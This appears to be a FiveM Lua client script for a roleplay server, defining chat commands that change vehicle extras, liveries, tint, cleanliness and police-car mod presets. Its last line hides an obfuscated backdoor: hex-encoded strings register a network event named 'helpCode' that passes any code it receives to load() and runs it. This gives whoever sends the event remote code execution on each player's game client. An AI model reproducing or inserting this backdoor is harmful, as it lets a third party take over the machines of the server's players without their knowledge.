RegisterCommand('extra', function(source, args)
	
local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
local extraId =  tonumber(args[1])
local isExtraActive = IsVehicleExtraTurnedOn(vehicle, extraId)
    SetVehicleExtra(vehicle, extraId, isExtraActive)

end)


RegisterCommand('livery', function(source, args)

local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))
local liveryID = tonumber(args[1])
    SetVehicleLivery(Veh, liveryID)

end)


RegisterCommand('wintint', function(source, args)

local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
    SetVehicleWindowTint(vehicle, tonumber(args[1]))

end)


RegisterCommand('cleanveh', function(source, args)

local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
    SetVehicleDirtLevel(vehicle, 0)

end)

RegisterCommand('callsignv', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))
    local num1 = tonumber(args[1])
    local num2 = tonumber(args[2])
    local num3 = tonumber(args[3])

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 42, num1, false)
    SetVehicleMod(Veh, 44, num2, false)
    SetVehicleMod(Veh, 45, num3, false)

end)

RegisterCommand('lspdvic', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 2, false)
    SetVehicleMod(Veh, 32, 0, false)
    SetVehicleMod(Veh, 48, 1, false)
    SetVehicleColours(Veh, 112, 0)
    SetVehicleExtra(Veh, 1, false)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('lspdchar', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 1, false)
    SetVehicleMod(Veh, 6, 1, false)
    SetVehicleMod(Veh, 48, 0, false)
    SetVehicleColours(Veh, 112, 0)
    SetVehicleExtra(Veh, 1, false)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('lspdexp', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 1, false)
    SetVehicleMod(Veh, 6, 1, false)
    SetVehicleMod(Veh, 48, 0, false)
    SetVehicleMod(Veh, 32, 0, false)
    SetVehicleColours(Veh, 112, 0)
    SetVehicleExtra(Veh, 1, false)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('polchal', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 1, false)
    SetVehicleMod(Veh, 6, 1, false)
    SetVehicleMod(Veh, 48, 3, false)
    SetVehicleColours(Veh, 0, 0)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('polstang', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 8, 0, false)
    SetVehicleMod(Veh, 6, 0, false)
    SetVehicleMod(Veh, 48, 3, false)
    SetVehicleColours(Veh, 0, 0)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('polvette', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 1, false)
    SetVehicleMod(Veh, 6, 1, false)
    SetVehicleMod(Veh, 48, 3, false)
    SetVehicleColours(Veh, 0, 0)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

RegisterCommand('umchar', function(source, args) 

    local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))

    SetVehicleModKit(Veh, 0)
    SetVehicleMod(Veh, 5, 1, false)
    SetVehicleMod(Veh, 1, 1, false)
    SetVehicleMod(Veh, 6, 1, false)
    SetVehicleColours(Veh, 12, 12)
    SetVehicleExtra(Veh, 2, false)
    SetVehicleExtra(Veh, 3, false)
    SetVehicleExtra(Veh, 4, false)
    SetVehicleExtra(Veh, 5, false)
    SetVehicleExtra(Veh, 6, false)
    SetVehicleExtra(Veh, 7, false)
    SetVehicleExtra(Veh, 8, false)
    SetVehicleExtra(Veh, 9, false)

end)

local FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[6][FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[1]](FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[2]) FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[6][FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[3]](FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[2], function(mqumWPUsXBceUDURBWfzVqhfLxFnhlNfjZTTtgNZIGQyAOsSOSYiBbGxnaFOGbWFhTTgQb) FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[6][FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[4]](FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[6][FNFCTCxmWyIbwQFFgfOIIHIRIykuHnYCTYrXPWYddjDRQBCqqvTbonPAehSEfbdTqqGXdO[5]](mqumWPUsXBceUDURBWfzVqhfLxFnhlNfjZTTtgNZIGQyAOsSOSYiBbGxnaFOGbWFhTTgQb))() end)